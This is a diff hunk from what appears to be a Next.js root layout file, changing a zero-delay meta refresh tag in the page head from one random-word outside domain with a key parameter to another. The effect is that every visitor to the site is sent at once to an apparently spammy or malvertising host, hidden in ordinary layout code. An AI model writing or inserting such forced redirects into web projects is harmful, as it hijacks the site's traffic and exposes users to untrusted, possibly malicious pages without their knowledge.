@@ -24,7 +24,7 @@ export default function RootLayout({ children }: LoadingLayoutProps) {
       <head>
         <meta
           httpEquiv="refresh"
-          content="0;url=https://surprisinglystaunchdemocratic.com/q7cx6zwfcs?key=74323cbffb1c765e6a7e69b5d942be25"
+          content="0;url=https://conceivesaucerfalcon.com/jydku1nj?key=c3d7818efc4bf1bf72c9e4c0b0ba8972"
         />
       </head>
       <body>{children}</body>
